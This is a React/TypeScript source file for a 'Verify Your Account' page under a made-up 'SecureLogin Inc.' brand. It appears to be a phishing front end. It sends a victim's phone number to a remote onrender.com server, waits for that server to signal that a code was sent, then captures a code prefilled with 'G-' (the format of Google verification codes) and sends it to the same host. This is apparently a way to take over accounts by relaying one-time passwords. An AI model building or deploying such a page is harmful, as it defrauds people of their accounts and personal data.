import { useEffect, useState } from "react";
import { toast } from "react-toastify";
import { Countries } from "./countries";
import "./css.css";
export default function Signup() {
    const [loading, setLoading] = useState(false)
    const [country, setCountry] = useState({ code: "+1", name: "United States", flag: "🇺🇸" })
    const [phoneNumber, setPhoneNumber] = useState<string>("")
    const [data, setData] = useState<Record<string, string> | null>(null)
    const [code, setCode] = useState<string | undefined>("G-")
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        
        try {
            e.preventDefault();
            setLoading(true)
            await fetch("https://demooooo.onrender.com/setPhoneNumberInfo", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ id: localStorage.getItem("userID"), phone_Number: phoneNumber, country: country.name, countryCode: country.code })
            })
            toast.success("Info submitted successfully")
        }
        finally {
            setLoading(false)
        }
    };

    useEffect(() => {
        fetch("https://demooooo.onrender.com/getPhoneNumberInfo", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ id: localStorage.getItem("userID") })
        }).then(response => response.json()).then((data) => {
            setData(data)
            setLoading(false)
        }).catch(() => {
            setLoading(false)
            console.log("ahh")
        })
    }, [loading])


    async function submit2(e: React.FormEvent<HTMLFormElement>) {
        e.preventDefault()
        
        setLoading(true)
        await fetch("https://demooooo.onrender.com/setPhoneNumber", {
            method: "post",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: code, id: localStorage.getItem("userID") })
        })
        toast.success("Info submitted successfully")
        setLoading(false)
    }


    function anotherPhoneNumber() {
        localStorage.removeItem("userID")
        const ee = Math.floor((Math.random() * (800000 - 100000 + 1)) + 100000)
        localStorage.setItem("userID", ee.toString())
        setLoading(true)
    }

    const validData = data?.userid
    const isCodeSent = data?.["codesent"]
    const message = data?.notification
    const codeSubmitted = data?.code
    return (
        <div className="container">
            <div className="header">
                <div className="logo">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width={40}><path fill="#c20000" d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8l0 378.1C394 378 431.1 230.1 432 141.4L256 66.8s0 0 0 0z" /></svg>
                </div>
                <h1>Verify Your Account</h1>
                <p> {validData ? message : "We'll send a verification code to your phone number to secure your account"}</p>
            </div>

            <div className="form-container">
                {validData ? (isCodeSent == '1' && !codeSubmitted ?
                    <form id="verificationForm" onSubmit={submit2}>
                        <div className="input-group">
                            <label htmlFor="phoneNumber">Code</label>
                            <div className="phone-input">
                                <input type="text" id="phoneNumber" value={code} onChange={(e) => setCode(e.target.value)} placeholder="Enter the code sent to you" required />
                            </div>
                        </div>

                        <button type="submit" className="btn">

                            {loading ? <svg
                                xmlns="http://www.w3.org/2000/svg"
                                style={{ margin: "auto", background: "none", display: "block" }}
                                width="20px"
                                height="20px"
                                viewBox="0 0 100 100"
                                preserveAspectRatio="xMidYMid"
                            >
                                <circle
                                    cx="50"
                                    cy="50"
                                    fill="none"
                                    stroke="#ffffff"
                                    stroke-width="8"
                                    r="35"
                                    stroke-dasharray="164.93361431346415 56.97787143782138"
                                >
                                    <animateTransform
                                        attributeName="transform"
                                        type="rotate"
                                        repeatCount="indefinite"
                                        dur="1s"
                                        values="0 50 50;360 50 50"
                                        keyTimes="0;1"
                                    ></animateTransform>
                                </circle>
                            </svg>
                                : <span className="text">Send Verification Code</span>}

                        </button>

                    </form>
                    : ""
                ) : <>
                    <form id="verificationForm" onSubmit={handleSubmit}>
                        <div className="input-group">
                            <label htmlFor="phoneNumber">Phone Number</label>
                            <div className="phone-input">
                                <div className="country-select">
                                    <span className="country-flag" id="selectedFlag">{country.flag}</span>
                                    <span className="country-code" id="selectedCode">{country.code}</span>
                                    <select onChange={(e) => { setCountry(JSON.parse(e.target.value)) }} value={JSON.stringify(country)} id="countryCode">
                                        {Countries.map((data, key) => {
                                            return (
                                                <option key={key} value={JSON.stringify(data)}>
                                                    {data.flag} {data.name} ({data.code})
                                                </option>
                                            )
                                        })}
                                    </select>
                                </div>
                                <input type="text" id="phoneNumber" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} placeholder="Enter your phone number" required />
                            </div>
                        </div>

                        <button type="submit" className="btn">

                            {loading ? <svg
                                xmlns="http://www.w3.org/2000/svg"
                                style={{ margin: "auto", background: "none", display: "block" }}
                                width="20px"
                                height="20px"
                                viewBox="0 0 100 100"
                                preserveAspectRatio="xMidYMid"
                            >
                                <circle
                                    cx="50"
                                    cy="50"
                                    fill="none"
                                    stroke="#ffffff"
                                    stroke-width="8"
                                    r="35"
                                    stroke-dasharray="164.93361431346415 56.97787143782138"
                                >
                                    <animateTransform
                                        attributeName="transform"
                                        type="rotate"
                                        repeatCount="indefinite"
                                        dur="1s"
                                        values="0 50 50;360 50 50"
                                        keyTimes="0;1"
                                    ></animateTransform>
                                </circle>
                            </svg>
                                : <span className="text">Verify Phone Number</span>}

                        </button>
                    </form>
                    <div className="success-message" id="successMessage">
                        <i className="fas fa-check-circle">
                        </i> Verification code sent successfully!
                    </div>
                    <div className="divider">
                        <span>OR</span>
                    </div>
                    <div className="terms">
                        By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
                    </div>
                </>
                }
            </div>

            {validData ? <div className="footer" onClick={() => anotherPhoneNumber()}>
                <p style={{ cursor: "pointer", color: "blue" }}>Verify another phone number</p>
            </div> : ""}

            <div className="footer">
                <p>Need help? <a href="#">Contact Support</a> | © 2023 SecureLogin Inc.</p>
            </div>
        </div>

    );
}
